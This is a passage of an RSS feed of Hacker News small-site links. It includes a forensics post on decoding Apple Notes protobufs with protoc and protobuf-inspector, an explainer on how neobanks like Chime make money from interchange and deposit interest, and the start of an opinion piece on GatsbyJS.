            <pubDate>Sun, 20 Sep 2020 03:08:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Prodigal Techbro]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24531490">thread link</a>) | @cyunker
<br/>
September 19, 2020 | https://conversationalist.org/2020/03/05/the-prodigal-techbro/ | <a href="https://web.archive.org/web/*/https://conversationalist.org/2020/03/05/the-prodigal-techbro/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://conversationalist.org/2020/03/05/the-prodigal-techbro/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531490</guid>
            <pubDate>Sun, 20 Sep 2020 02:06:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Apple Notes Protobuf]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531472">thread link</a>) | @todsacerdoti
<br/>
September 19, 2020 | https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/ | <a href="https://web.archive.org/web/*/https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody"> <p><strong>TL;DR</strong>: This post explains portions of two protobufs used by Apple, one for the Note format itself and another for embedded objects. More importantly, it explains how you can figure out the structure of protobufs.</p> <!--more--> <h2 id="background">Background</h2> <p>Previous entries in this series covered how to deal with <a href="https://ciofecaforensics.com/2020/01/10/apple-notes-revisited/">Apple Notes</a> and the <a href="https://ciofecaforensics.com/2020/01/13/apple-notes-revisited-easy-embedded-objects/">embedded objects</a> in them, including <a href="https://ciofecaforensics.com/2020/01/14/apple-notes-revisited-embedded-tables/">embedded tables</a> and <a href="https://ciofecaforensics.com/2020/01/20/apple-notes-revisited-galleries/">galleries</a>. Throughout these posts, I have referred to the fact that Apple uses protocol buffers (protobufs) to store the information for both notes and the embedded objects within them. What I have not yet done is actually provide the .proto file that was used to generate the Ruby output, or explained how you can develop the same on your app of interest. If you only care about the first part of that, you can view the <a href="https://github.com/threeplanetssoftware/apple_cloud_notes_parser/blob/master/proto/notestore.proto">.proto file</a> or the <a href="https://github.com/threeplanetssoftware/apple_cloud_notes_parser/blob/master/proto/protobuf_config.py">config</a> I use for <a href="https://github.com/jmendeth/protobuf-inspector">protobuf-inspector</a>. Both of these files are just a start to pull out the important parts for processing and can certainly be improved.</p> <p>As with previous entries, I want to make sure I give credit where it is due. After pulling apart the Note protobuf and while I was trying to figure out the table protobuf, I came across <a href="https://github.com/dunhamsteve">dunhamsteve’s</a> work. As a result, I went back and modified some of my naming to better align to what he had <a href="https://github.com/dunhamsteve/notesutils/blob/master/notes.md">published</a> and added in some fields like version which I did not have the data to discover.</p> <h2 id="what-is-a-protocol-buffer">What is a Protocol Buffer?</h2> <p>To quote directly from <a href="https://developers.google.com/protocol-buffers">the source</a>,</p> <blockquote> <p>Protocol buffers are Google’s language-neutral, platform-neutral, extensible mechanism for serializing structured data – think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages.</p> </blockquote> <p>What does that mean? It means a protocol buffer is a way you can write a specification for your data and use it in many projects and languages with one command. The end result is source code for whatever language you are writing in. For example, <a href="https://github.com/sballin/alfred-search-notes-app/blob/master/search/proto/notestore.pb.go">Sean Ballinger’s Alfred Search Notes App</a> used my <code>notestore.proto</code> file to compile to Go instead of Ruby to interact with Notes on MacOS. When you use it in your program, the data which you save will be a raw data stream which won’t look like much, but will be intelligable to any code with that protobuf definition.</p> <p>The definition is generally a <code>.proto</code> file which would look something like:</p> <figure><pre><code data-lang="protobuf"><span>syntax</span> <span>=</span> <span>"proto2"</span><span>;</span>

<span>// Represents an attachment (embedded object)</span>
<span>message</span> <span>AttachmentInfo</span> <span>{</span>
   <span>optional</span> <span>string</span> <span>attachment_identifier</span> <span>=</span> <span>1</span><span>;</span>
   <span>optional</span> <span>string</span> <span>type_uti</span> <span>=</span> <span>2</span><span>;</span>
<span>}</span></code></pre></figure> <p>This definition would have just one message type (AttachmentInfo), with two fields (attachment_identifier and type_uti), both optional. This is using the <code>proto2</code> syntax.</p> <h2 id="why-care-about-protobufs">Why Care About Protobufs</h2> <p>Protobufs are everywhere, especially if you happen to be working with or looking at Google-based systems, such as Android. Apple also uses a lot of them in iOS, and for people that have to support both operating systems, using a protobuf makes the pain of maintaining two different code bases slightly less annoying because you can compile the same definition to different languages. If you are in forensics, you may come across something that looks like it isn’t plaintext and discover that you’re actually looking at a protobuf. When it comes specifically to Apple Notes, protobufs are used both for the Note itself and the attachments.</p> <h2 id="how-to-use-a-proto-file">How to Use a .proto file</h2> <p>Assuming you have a <code>.proto</code> file, either from building one yourself or from finding one from your favorite application, you can compile it to your target language using <a href="https://github.com/protocolbuffers/protobuf/releases">protoc</a>. The resulting file can then be included in your project using whatever that language’s include statement is to create the necessary classes for the data. For example, when writing Apple Cloud Notes Parser in Ruby, I used <code>protoc --ruby_out=. ./proto/notestore.proto</code> to compile it and then <code>require_relative 'notestore_pb.rb'</code> in my code to include it.</p> <p>If I wanted instead to add in support for python, I would only have to make this change: <code>protoc --ruby_out=. --python_out=. ./proto/notestore.proto</code></p> <h2 id="how-can-you-find-a-protobuf-definition-file">How Can You Find a Protobuf Definition File?</h2> <p>If you come up against a protobuf in an application you are looking at, you might be able to find the <code>.proto</code> protobuf definition file in the application itself or somewhere on the forensic image. I ended up going through an iOS 13 forensic image earlier this year and found that Apple still had some of theirs on disk:</p> <figure><pre><code data-lang="shell"><span>[</span>notta@cuppa iOS13_logical]<span>$ </span>find | <span>grep</span> <span>'\.proto$'</span>
./System/Library/Frameworks/MultipeerConnectivity.framework/MultipeerConnectivity.proto
./System/Library/PrivateFrameworks/ActivityAchievements.framework/ActivityAchievementsBackCompat.proto
./System/Library/PrivateFrameworks/ActivityAchievements.framework/ActivityAchievements.proto
./System/Library/PrivateFrameworks/CoreLocationProtobuf.framework/Support/Harvest/CLPCollectionRequest.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingDatabaseCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingDomainCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingInvitationCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingCloudKitCodables.proto
./System/Library/PrivateFrameworks/CloudKitCode.framework/RecordTransport.proto
./System/Library/PrivateFrameworks/RemoteMediaServices.framework/RemoteMediaServices.proto
./System/Library/PrivateFrameworks/CoreDuet.framework/knowledge.proto
./System/Library/PrivateFrameworks/HealthDaemon.framework/Statistics.proto
./System/Library/PrivateFrameworks/AVConference.framework/VCCallInfoBlob.proto
./System/Library/PrivateFrameworks/AVConference.framework/captions.proto</code></pre></figure> <p>Some of these are <em>really</em> interesting when you look at them, particularly if you care about their location data and pairing. You don’t even have to have an iOS forensic image sitting around as all of the same files are included in your copy of MacOS 10.15.6, as well, if you run <code>sudo find /System/ -iname "*.proto"</code>. I am not including any interesting snippets of those because they are copyrighted by Apple and I would explicitly note that none are related to Apple Notes or the contents of this post.</p> <p>In general, you should not expect to find these definitions sitting around since the definition file isn’t needed once the code is generated. For more open source applications, you might be interested in some <a href="https://www.google.com/search?q=ext%3Aproto++AND+inurl%3Aproto+AND+message+AND+proto2">Google Dorks</a>, especially when looking at Android artifacts, as you might still find them.</p> <h2 id="how-can-you-rebuild-the-protobuf">How Can You Rebuild The Protobuf?</h2> <p>But what if you can’t find the definition file, how can you rebuild it yourself? This was the most interesting part of rewriting Apple Cloud Notes Parser as I had no knowledge of how Apple typically represents data, nor protobufs, so it was a fun learning adventure.</p> <p>If you have nothing else, the <code>protoc --decode-raw</code> command can give you an intial look at what is in the data, however this amounts to not much more than pretty printing a JSON object, it doesn’t do a great job of telling you you what might be in there. I made heavy use of mildsunrise’s <a href="https://github.com/mildsunrise/protobuf-inspector">protobuf-inspector</a> which at least makes an attempt to tell you what you might be looking at. Another benefit to using this is that it lets you incrementally build up your own definition by editing a file named <code>protobuf_config.py</code> in the protobuf-insepctor folder.</p> <p>For example, below is the output from protobuf-inspector when I ran it on the Gunzipped contents of one of the first notes in my test database.</p> <figure><pre><code data-lang="python"><span>[</span><span>notta</span><span>@</span><span>cuppa</span> <span>protobuf</span><span>-</span><span>inspector</span><span>]</span><span>$</span> <span>python3</span> <span>main</span><span>.</span><span>py</span> <span>&lt;</span> <span>~/</span><span>note_18</span><span>.</span><span>blob</span> 
<span>root</span><span>:</span>
    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
        <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
        <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
        <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
            <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>"Pure blob title"</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>2</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>8</span><span>)</span>
                <span>4</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>3</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>10</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>4</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>14</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>10</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                    <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4294967295</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                    <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4294967295</span>
            <span>4</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>bytes</span> <span>(</span><span>16</span><span>)</span>
                        <span>0000</span>   <span>EE</span> <span>FE</span> <span>10</span> <span>DA</span> <span>5</span><span>A</span> <span>79</span> <span>43</span> <span>25</span> <span>88</span> <span>BA</span> <span>6</span><span>D</span> <span>CA</span> <span>E2</span> <span>E9</span> <span>B7</span> <span>EC</span>                          <span>....</span><span>ZyC</span><span>%</span><span>..</span><span>m</span><span>.....</span>
                    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>24</span><span>)</span>
                    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>9</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>3</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>3</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
          …</code></pre></figure></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/">https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/</a></em></p>]]>
            </description>
            <link>https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531472</guid>
            <pubDate>Sun, 20 Sep 2020 02:00:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Do Neobanks Make Money?]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531372">thread link</a>) | @michaelm244
<br/>
September 19, 2020 | https://blog.mattheakis.com/how_do_neobanks_make_money/ | <a href="https://web.archive.org/web/*/https://blog.mattheakis.com/how_do_neobanks_make_money/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <article>
  
  <time datetime="2020-09-15T06:52:31+00:00">15 Sep 2020</time>
  <p>Neobanks are on a tear and users are loving them. Neobanks are online-only banks, typically funded by venture capital, that piggy-back on top of an existing institution’s banking license and offer a way for customers to store/spend money. Examples include Revolut, Nubank, Chime, Simple, N26, and more. They have a real shot at becoming the mainstream banking choice for customers over the next decade. Nubank, the most popular neobank in Brazil, recently <a href="https://www.reuters.com/article/us-nubank-brazil-growth/brazilian-fintech-nubank-has-grown-to-15-million-users-ceo-idUSKBN1WQ26C" target="_blank">announced</a> that they have 15 million customers. For reference, Wells Fargo has <a href="https://google.com/" target="_blank">22 million active users</a> on its mobile app. Neobanks are a rising force and key in understanding where the financial services industry is headed.</p>

<p>But how do these neobanks make money? The imprecise answer of “they make money when you swipe their card” doesn’t tell you much. In this post, I’ll concretely show how the mechanics of a neobank’s business model works.</p>

<p>Let’s take a look at <a href="https://www.chime.com/" target="_blank">Chime</a>, the largest consumer neobank in the US. Chime’s core offering is a debit card alongside checking and savings accounts. They have nifty features like the ability to receive your paycheck two days early, no overdraft fees, and 100% mobile banking. With 60% of Americans not being able to cover a surprise $1,000 expense, a 2-day advance on a paycheck can be a huge relief for managing expenses. And the nixing of overdraft fees is a massive help for the <a href="https://www.pymnts.com/news/banking/2018/banking-overdraft-fees-cfbp-credit-unions/" target="_blank">US consumers paying a mind-boggling $34 billion/year</a> in overdraft fees. These differentiated features have led to Chime amassing <a href="https://techcrunch.com/2019/09/04/chime-now-has-5-million-customers-and-introduces-overdraft-alternative/" target="_blank">5 million customers</a> and <a href="https://www.businessinsider.com/chime-set-to-quadruple-revenue-in-2019-2019-11" target="_blank">$200 million in annualized revenue</a>.</p>

<p><strong>A neobank like Chime primarily makes money in two ways:</strong></p>

<ol>
  <li>Interchange revenue paid by payment processors (e.g., Stripe) when they process a payment for a Chime card</li>
  <li>Collecting interest from users’ deposits</li>
</ol>

<p>Although some neobanks have different revenue streams (e.g., Wealthfront charges users roboadvisor fees as a percentage of the total value of assets stored with them), interchange and deposits interest are the two largest and most common revenue streams for neobanks. These are also some of the largest revenue streams for big banks (lending though typically being the largest).</p>

<h3 id="interchange"><strong>Interchange</strong></h3>

<p>Interchange revenue is money that a card issuer (such as Chime) receives when someone swipes their card. Interchange is paid by the merchant through payment processing fees. The merchant is the party accepting a card payment in return for goods/services (e.g., your local supermarket). As an example, if a merchant uses <a href="https://stripe.com/" target="_blank">Stripe</a> for payment processing and is paying the standard <a href="https://stripe.com/pricing" target="_blank">2.9%</a> in transaction fees, Stripe will use a portion of that 2.9% to pay the card issuer.</p>

<h2><img src="https://www.helcim.com/pictures/credit-card-processing-flow-152858808066.jpg" alt="card_process"></h2>

<p>Image Credit: <a href="https://www.helcim.com/article/how-credit-card-processing-works/" target="_blank">Helcim</a></p>

<p>The specific amount paid to the card issuer depends on a number of factors and it varies for every transaction. The most important factors are:</p>

<ul>
  <li>Whether the card is debit or credit
    <ul>
      <li>Credit is significantly higher interchange</li>
    </ul>
  </li>
  <li>Whether the card has specific rewards/perks
    <ul>
      <li><a href="https://usa.visa.com/pay-with-visa/cards/visa-credit-cards/visa-infinite-credit-cards.html" target="_blank">Visa Infinite</a> (many rewards/perks) has a higher interchange rate than the standard Visa card</li>
    </ul>
  </li>
  <li>The type of the merchant for a given transaction
    <ul>
      <li>Hotels have some of the highest interchange rates</li>
    </ul>
  </li>
</ul>

<p>Ultimately the card network (e.g., Visa) decides what the interchange rates are. The key equation for an interchange revenue stream is:</p>

<p><i>avg. interchange rate * total transaction volume</i></p>

<p>In Chime’s case, their cards are on the Visa network so Visa decides how much interchange they receive. The Visa interchange rates, along with Chime’s specific rates, are <a href="https://usa.visa.com/dam/VCOM/download/merchants/visa-usa-interchange-reimbursement-fees.pdf" target="_blank">public</a> <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Depending on the type of merchant and transaction, Chime earns between 0.8% - 1.9% of a transaction’s amount, Although it’s impossible to know the exact amount of interchange Chime receives without knowing the distribution of Chime users’ spending, a reasonable guess based on aggregate consumer spending would put Chime’s average interchange rate at 1.25%<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>. This means that Chime receives around 1.25% of _all spending on their cards_. Not bad! There are still a handful of costs that Chime has to pay per transaction:</p>

<ul>
  <li>Intermediary card processors
    <ul>
      <li>Example: Chime uses <a href="https://www.galileo-ft.com/" target="_blank">Galileo</a>, which likely charges them anywhere from 0.05% - 0.4% of transaction volume</li>
    </ul>
  </li>
  <li>Fraud: if a customer loses their card and a thief spends money on it, Chime may have to cover the cost
    <ul>
      <li>Note: keep in mind that since Chime is offering debit cards, not credit cards, there is no risk of the customer not paying back Chime for transactions</li>
    </ul>
  </li>
  <li>Server costs: the server that has to process a transaction</li>
</ul>

<p>Even with these costs, Chime is still making a handsome profit per transaction. Being the card issuer, as they are here, is a very high-margin business.</p>

<h3 id="deposits-interest"><strong>Deposits Interest</strong></h3>

<p>Interest revenue is earned by a depository institution investing customer funds in low-risk securities. The depository institution typically also pays the customer for keeping their deposits at the institution. The key equation for profitability of this revenue stream is:</p>

<p><i>(% interest earned - % interest paid to depositor) * deposits amount</i></p>

<p>The <em>% interest earned</em> for neobanks is typically equal to the <a href="https://fred.stlouisfed.org/series/FEDFUNDS" target="_blank">effective federal funds rate</a>. Because the federal funds rate is constantly shifting, the profitability of this revenue stream for neobanks is constantly shifting. This is why neobanks frequently change the interest rate offered to depositors (see <a href="https://blog.wealthfront.com/category/product-news/" target="_blank">Wealthfront’s blog</a> as an example). This is a stark contrast to big banks however. A key benefit of a banking charter is that banks can lend out a multiple of their deposits as loans (e.g., mortgages, business loans). This amount is referred to as net interest margin, and is typically much higher than the federal funds rate - <a href="https://www.investopedia.com/ask/answers/061715/what-net-interest-margin-typical-bank.asp" target="_blank">it was 3.3% on average for banks in 2018</a>. The _% interest paid to depositor* is how much the depositor earns by storing their funds with the institution, and is set by the depository institution. For the recent wave of high-yield accounts offered by neobanks, they’ve set <em>% interest paid to depositor</em> essentially equal to *% interest earned_, making this revenue stream’s profitability close to zero. The typical rationale is for the high-yield account to draw in consumers for other higher-margin products such as debit/credit cards or loans.</p>

<p>In Chime’s case, <em>% interest earned</em> (the federal funds rate) is 0.09% at the time of writing (Sept. 2020), and <a href="https://chime.zendesk.com/hc/en-us/articles/221487887-What-do-I-need-to-know-about-the-Chime-Savings-Account-" target="_blank"><em>% interest paid to depositor</em></a> is 1.00%. This means that Chime is actually losing money on their deposit account product, and likely using it as a <a href="https://en.wikipedia.org/wiki/Loss_leader" target="_blank">loss leader</a> for the debit card, which has far higher profit margins. Also note that Chime only gives depositors 1% in interest for funds in their savings account. For any funds in the checking account (which over all customers may be larger), no interest is given.</p>

<p>These are the two main revenue streams for the majority of neobanks, but there are also others such as <a href="https://en.wikipedia.org/wiki/Cross-selling" target="_blank">cross-selling</a>, <a href="https://www.svmcards.com/" target="_blank">reward redemption referrals</a>, and new ones being created by startups. Hopefully this has given you a grasp of the basics, let me know if you have any thoughts/questions below!</p>




  <br>
  
  
  
</article>

      </div></div>]]>
            </description>
            <link>https://blog.mattheakis.com/how_do_neobanks_make_money/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531372</guid>
            <pubDate>Sun, 20 Sep 2020 01:29:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The UX Reasons Why GatsbyJS Will Win Long Term]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531185">thread link</a>) | @taphangum
<br/>
September 19, 2020 | https://planflow.dev/blog/5-ux-reasons-why-gatsby-will-win | <a href="https://web.archive.org/web/*/https://planflow.dev/blog/5-ux-reasons-why-gatsby-will-win">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>The Emergence Of Front End Frameworks</h2><p>The increasing complexity of the web has led to a rise in demand for tools that appropriately respond to and manage that complexity.</p><p>This complexity has been felt not just by the user (in the form of more information filled, dynamic UI’s), but by the people who are trying to build the tools that manage that complexity (the developers) as well.</p><p>The best tools that have come to the forefront, which have succeeded in managing complexity on both sides of the table, have been Front End Frameworks.</p><p>On the user’s end, the usage of Front End Framework’s has led to dramatically faster load times, as well as more responsive UI’s. Making the increased information that now needs to be handled by them, much easier to deal with.</p><p>On the developer’s side, the use of Front End Frameworks (and the resource that is the vast ecosystems within them) has given them immense leverage, by not having to reinvent the wheels that handle a lot of the complex actions that need to be done on the modern web. It has also allowed developers to no longer have to worry about their feature choices slowing down the site, as the ‘build’ process has offloaded the majority of the heavy lifting away from the browser or any servers that would be connected to it.</p><p>Overall, Front End Frameworks have now become a serious consideration for any new project that is intended for the modern web.</p><h2>The Emergence Of GatsbyJS</h2><p>Among the many Front End Frameworks that have popped up over the last few years, a few have stood out among the rest as being the ideal choice for the vast majority of use cases.</p><p>One that has begun to stand out, in particular, has been <a target="_blank" title="GatsbyJS" href="https://gatsbyjs.com/">GatsbyJS</a>.</p><p>It is a framework that I am personally a big fan of, though I have, <a target="_blank" title="https://jaredpalmer.com/gatsby-vs-nextjs" href="https://jaredpalmer.com/gatsby-vs-nextjs">as with many others</a>, had my fair share of frustrations with it<a target="_blank" title="https://jaredpalmer.com/gatsby-vs-nextjs" href="https://jaredpalmer.com/gatsby-vs-nextjs"></a>. Despite this, there are a few key UX reasons that I believe will make it the biggest player in the Front End Framework space within the next few years.</p><p>Below I will outline what those UX reasons are and why they are crucial to the adoption of Gatsby over other frameworks in the future.</p><h3><strong>The 5 UX reasons why Gatsby will win long term</strong></h3><h4><strong>1. A FAST installation experience (with the ability to use templates!)</strong></h4><p>The first thing that caught my attention when I first came across and used Gatsby for the first time was just how easy it was to get something up and running.&nbsp;</p><p>A simple installation of the Gatsby CLI 'npm install -g gatsby-cli', followed by a Gatsby creation command that pulled from any relevant repo I wanted (<strong>as a template</strong>) 'gatsby&nbsp;new&nbsp;my-tailwind-starter&nbsp;https://github.com/PlanFlowDev/Simplicity-Itself-Gatsby-Tailwind-Starter-Theme', was enough to get me a project setup. Once installed, to run it, all I had to do was run ‘gatsby develop’ within my project directory.&nbsp;</p><p>Everything just worked. And I was ready to go quickly.&nbsp;</p><p>The ability to get up and running quickly with a template was key to making this experience both unique and very satisfying.&nbsp;</p><p>In terms of UX, having to ‘start from scratch’ is one of the worst, yet mostly unknown UX mistakes that most new technologies make when trying to attract new users.&nbsp;</p><p>The more you can reduce the overhead to getting the user to a <a target="_blank" title="Kathy Sierra - Badass - Making Users Awesome" href="https://www.youtube.com/watch?v=3fpHYm6kTik">satisfied state of ‘having something’,</a> the better adoption rates you’ll see.&nbsp;</p><p>Gatsby’s fast installation with the ability (even encouragement) to use a template, does this well.</p><h4><strong>2. A fast-growing ecosystem (plugins and themes)</strong></h4><p>Getting up and running with new technology is always a situation that requires learning and the use of additional resources, to help make the integration process easier, both mentally and with the technology itself.</p><p>The size and activity of the ecosystem that supports and underpins a technology is key to assisting rapid adoption and a positive experience for the users.</p><p>The momentum that an active and growing community also makes people very forgiving of errors and mishaps with the technology, which are inevitable, and keeps the plugins, themes, and projects coming because people can usually find solutions (ie. via StackOverflow or Reddit) to their problems as they’re building.</p><p>Gatsby, of all the Front End Frameworks I’ve seen, especially for building static sites, has the best community.</p><h4><strong>3. Easy to read documentation</strong></h4><p>When you find yourself on the documentation page of the technology you’re using more 